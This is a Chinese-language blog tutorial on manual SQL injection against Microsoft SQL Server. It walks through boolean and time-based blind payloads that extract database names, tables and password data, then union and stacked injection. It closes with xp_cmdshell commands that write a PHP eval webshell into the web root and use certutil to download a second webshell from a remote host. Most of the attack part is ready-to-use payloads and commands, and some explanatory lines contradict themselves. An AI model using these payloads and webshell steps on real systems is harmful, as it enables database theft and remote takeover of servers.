**判断当前数据库用户权限**

```
and 1=(IS_SRVROLEMEMBER('sysadmin'))        //返回正常为sa      
and 1=(IS_MEMBER('db_owner'))               //返回正常为DB_OWNER      
and 1=(IS_srvrolemember('public'))          //public权限,较低
```


如果当前用户是sa，则执行三个都正常显示。如果是db\_owner，则执行sa不正常显示，执行public正常显示。如果是public，则只执行public才正常显示 

![](https://img-blog.csdnimg.cn/2020030216552775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**判断xp\_cmdshell是否存在** 

```
and 1=(Select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')
```


![](https://img-blog.csdnimg.cn/20200302210108771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

正常显示，说明已开启。如果不存在，则需要开启。

如果开启后，想要通过xp\_cmdshell执行系统命令，需要该注入点存在堆叠注入

![](https://img-blog.csdnimg.cn/20200302212441853.png)

**判断数据库的个数**

```
and (select count(name) from master..sysdatabases)=N
```


由图可知，有7个数据库 

![](https://img-blog.csdnimg.cn/20200302210223153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**判断dbid个数，一般数据库有多少个，dbid的值就为多少**

```
and (select count(*) from master..sysdatabases where dbid=N)=1
```


![](https://img-blog.csdnimg.cn/20200302210317777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 **通过dbid得到所有数据库名** 

当使用上一条命令不能执行时，可以使用下面的命令，查询数据库的个数，以及每个数据库的名字

```
判断dbid数据库的长度，由以下得知dbid为1数据库的长度是8      
and len(db_name(1))>5         //正常显示      
and len(db_name(1))>6         //不正常显示       
大于5正常显示，大于6不正常显示，所以第一个数据库长度是6，即      
一般来说，查的前6个数据库就是自带的那6个数据库，第7个开始才是我们自己建的       
and len(db_name(7))>3         //正常显示      
and len(db_name(7))>4         //不正常显示      1
大于3正常显示，大于4不正常显示，所以第7个数据库名的长度为4       1
判断dbid为7数据库字符的ascii值      1
and ascii(substring(db_name(7),1,1))>100   //正常显示      1
and ascii(substring(db_name(7),1,1))>150   //不正常显示      1
and ascii(substring(db_name(7),1,1))>125   //不正常显示      1
and ascii(substring(db_name(7),1,1))>112   //正常显示      1
and ascii(substring(db_name(7),1,1))>118   //不正常显示      1
and ascii(substring(db_name(7),1,1))>115   //正常显示      1
and ascii(substring(db_name(7),1,1))>116   //不正常显示       2
大于115正常显示，大于116不正常显示，所以第七个数据库的第一个字符的ascii值为116，对应的字符是t       2
以此类推，数据库的第二个字符为  and ascii(substring(db_name(7),2,1))>100      2
         数据库的第三个字符为：and ascii(substring(db_name(7),3,1))>100      2
         数据库的第三个字符为：and ascii(substring(db_name(7),4,1))>100      2
最后得到第7个数据库名为：test
```


 **判断当前数据库名**

```
判断数据库的长度，由以下得知数据库的长度是8      
and len(db_name())>3         //正常显示      
and len(db_name())>4         //不正常显示       
大于3正常显示，大于4不正常显示，所以数据库名的长度为4       
判断数据库字符的ascii值，用二分法      
and ascii(substring(db_name(),1,1))>100   //正常显示      
and ascii(substring(db_name(),1,1))>150   //不正常显示      1
and ascii(substring(db_name(),1,1))>125   //不正常显示      1
and ascii(substring(db_name(),1,1))>112   //正常显示      1
and ascii(substring(db_name(),1,1))>118   //不正常显示      1
and ascii(substring(db_name(),1,1))>115   //正常显示      1
and ascii(substring(db_name(),1,1))>116   //不正常显示       1
大于115正常显示，大于116不正常显示，所以数据库第一个字符的ascii值为116，对应的字符是t       1
以此类推，数据库的第二个字符为  and ascii(substring(db_name(),2,1))>100      1
         数据库的第三个字符为：and ascii(substring(db_name(),3,1))>100      2
         数据库的第三个字符为：and ascii(substring(db_name(),4,1))>100       2
最后得到数据库名为：test
```


这里我们已经知道了当前数据库名为：  test 

**爆破test数据库中表的个数**

```
and (select count(name) from test..sysobjects where xtype='U')>0   正常显示      
and (select count(name) from test..sysobjects where xtype='U')>1   不正常显示      
所以test数据库只有一个表
```


**爆破test数据库中表**

这里爆破表的时候，不能爆破表名的长度，所以只能爆破表名的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。注意，这里爆破得到的表名有 dbo. 

```
第一个表的第一个字符的ascii值      
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N      
第一个表的第二个字符的ascii值      
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N      
第一个表的第三个字符的ascii值      
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N      
......      
当爆破到第10个字符的时候，发现>0都不正常显示，说明不存在第10位      
爆破得到表名为：dbo.users       1
如果有第二个表，第三个表...       1
爆破第二个表的第一个字符的ascii值      1
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N      1
爆破第二个表的第二个字符的ascii值      1
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N      1
爆破第二个表的第三个字符的ascii值      1
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N      1
......       2
爆破第三个表的第一个字符的ascii值      2
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N      2
爆破第三个表的第二个字符的ascii值      2
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N      2
爆破第三个表的第三个字符的ascii值      2
AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
```


这里我们爆出了test数据库中存在 dbo.users 表 

**爆破test数据库中user表的字段数**

```
and (select count(name) from test..syscolumns where id=(select id from test..sysobjects where name='users'))=3  #正常显示      
所以users表有3个字段
```


这里我们爆出了test数据库中users表有3个字段

**爆破test数据库中users表的字段名**

```
爆破test数据库中user表的第一个字段名的长度      
and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>1  正常显示      
and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>2  不正常显示      
所以users表的第一个字段名长度为2       
爆破test数据库中user表的第一个字段的第一个字符的ascii值,二分法      
and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),1,1))>N      
爆破test数据库中user表的第一个字段的第二个字符的ascii值：      
and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),2,1))>N      1
........      1
最后得到第一个字段为：id       1
爆破test数据库中user表的第二个字段名的长度      1
and len((select top 1 col_name(object_id('users'),2) from test..sysobjects))>N       1
爆破test数据库中user表的第二个字段的第一个字符的ascii值：      1
and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),1,1))>N      1
爆破test数据库中user表的第二个字段的第二个字符的ascii值：      1
and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),2,1))>N      2
爆破test数据库中user表的第三个字段的第三个字符的ascii值：      2
and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),3,1))>N       2
爆破test数据库中user表的第三个字段名的长度      2
and len((select top 1 col_name(object_id('users'),3) from test..sysobjects))>N      2
........
```


这里假设我们爆出了users表的三个字段名：id，username，password

**爆test数据库user表中数据总条数**

```
and (select count(*) from test..users)=N
```


由图可知只有四条数据 

![](https://img-blog.csdnimg.cn/20200302210618376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**爆破test数据库中user表中password列中的数据**

这里爆破数据的时候，不能爆破数据的长度，所以只能爆破数据的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。

```
爆破test数据库中users表中password列中第一行数据的第一个字符的ascii值      
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))>N      
爆破test数据库中user表中password列中第一行数据的第二个字符的ascii值      
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),2,1))>N      
爆破test数据库中user表中password列中第一行数据的第三个字符的ascii值      
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),3,1))>N      
爆破test数据库中user表中password列中第一行数据的第四个字符的ascii值      
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),4,1))>N      
当爆破到第5个字符的时候，发现ascii>0都不正常显示，说明，第一个数据长度为4      1
最后爆出test数据库users表password列的第一条数据是：root       1
爆破test数据库中user表中password列中第二行数据的第一个字符的ascii值      1
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),1,1))>N      1
爆破test数据库中user表中password列中第二行数据的第二个字符的ascii值      1
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),2,1))>N      1
爆破test数据库中user表中password列中第二行数据的第三个字符的ascii值      1
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),3,1))>N      1
........
```


延时注入 
-----

```
判断是否是SA权限      
if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2'      
判断是否是站库分离(延时后返回正确页面，确定站库没有分离)      
if(host_name()=@@servername) WAITFOR DELAY '0:0:2'       
判断数据库的个数      
IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases),1,1))=55) WAITFOR DELAY '0:0:2'        
判断是否开启xp_cmdshell      1
if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--       1
更多延时注入payload，可以查看sqlmap
```


根据响应时间判断执行是否正确 

![](https://img-blog.csdnimg.cn/20200302214343596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200302214428505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Union联合查询 
----------

```
首先order by查看有几列      
1 order by 3  正常显示      
1 order by 4  不正常显示      
说明有3列       
然后我们可以select NULL,NULL,想查询的数据
```


查询数据库版本 

![](https://img-blog.csdnimg.cn/20200302213255993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查询机器名

![](https://img-blog.csdnimg.cn/20200302213347277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查询所有数据库名

![](https://img-blog.csdnimg.cn/20200302214051656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

堆叠注入
----

![](https://img-blog.csdnimg.cn/20200412091903761.png)

SQLServer堆叠注入，由于执行的命令没有回显，所以需要结合时间盲注来查询数据。由于堆叠查询的语句会被执行，所以下面的SQLServer获取权限的奇淫技巧，就是利用到了堆叠注入这一特性。

SQLServer获取权限的奇淫技巧
------------------

利用前提：

*   目标网站注入支持堆叠注入
*   当前权限是SA权限
*   使用sqlmap的 --os-shell 无法获取到权限

这里很多人就会问了，既然是SA权限，不是可以直接利用xp\_cmdshell执行系统命令吗？对，没错，但是你这里使用注入执行xp\_cmdshell的命令没有回显。我们这个获取权限的思路就是，找到目标网站的绝对路径，然后往绝对路径下写入木马，然后获取权限。

我们这里是通过先找到目标网站的一个文件，然后通过遍历目标服务器的磁盘，找到该文件，将其路径写入自建的表中，然后再读取该表得到网站绝对路径。

这里利用的查找命令是

```
查找目标机器C盘下的test.txt文件      
for /r c:\ %i in (test*.txt) do @echo %i   #这里的文件名后缀前那个点一定要加*号      
dir /s /b c:\test.txt
```


这里假设我们已经知道目标网站下有一个test.txt文件，

```
创建表hack，并添加一个tmp的字段      
create table hack (tmp varchar(1000));--
```


![](https://img-blog.csdnimg.cn/20200303195239100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查看表是否创建成功

```
python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test --tables
```


![](https://img-blog.csdnimg.cn/20200303195429225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
查找目标机器C盘下的test.txt路径，并将结果写入刚刚创建的hack表的tmp字段      
;insert into hack(tmp) exec master..xp_cmdshell 'dir /s /b c:\test.txt';--      
或      
;insert into hack(tmp) exec master..xp_cmdshell 'for /r c:\ %i in (test*.txt) do @echo %i';--
```


以下两条语句均可 

![](https://img-blog.csdnimg.cn/20200303195547854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020030320463614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

读取数据，得到目标网站绝对路径为：C:\\phpstudy\\www\\

```
python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test -T hack --dump
```


![](https://img-blog.csdnimg.cn/20200303195720665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将一句话木马写入目标网站根目录，并命名为shell.php。注意这里的一句话木马的 < 和 > 前要加上 ^

```
1;exec master..xp_cmdshell 'echo ^<?php @eval($_POST[x]);?^> > C:\phpstudy\www\shell.php';--
```


![](https://img-blog.csdnimg.cn/2020030320265887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

菜刀连接之

![](https://img-blog.csdnimg.cn/20200303202816249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果写入的木马文件连接不上的话，我们还可以通过下面手段使用 certutil 远程下载木马文件，前提是目标机器通公网。

```
1;exec master..xp_cmdshell 'certutil -urlcache -split -f http://x.x.x.x/shell.php C:\phpstudy\www\shell2.php';--
```


![](https://img-blog.csdnimg.cn/20200303203504450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

连接下载的shell2.php木马即可！

![](https://img-blog.csdnimg.cn/20200303203655277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

还原备份数据库
-------

鼠标右键数据库——>还原数据库

![](https://img-blog.csdnimg.cn/20200419173747714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

选择源设备，选择我们的备份数据库。然后目标数据库也选择该备份数据库，还原那里打上勾，点击确定即可。

![](https://img-blog.csdnimg.cn/20200419173916963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[史上最详细的sqlServer手工注入详解](https://mp.weixin.qq.com/s/I0IQzDYMyvWJhRVOuMuzXA)

文章首发于安全客：[https://www.anquanke.com/post/id/200154](https://www.anquanke.com/post/id/200154)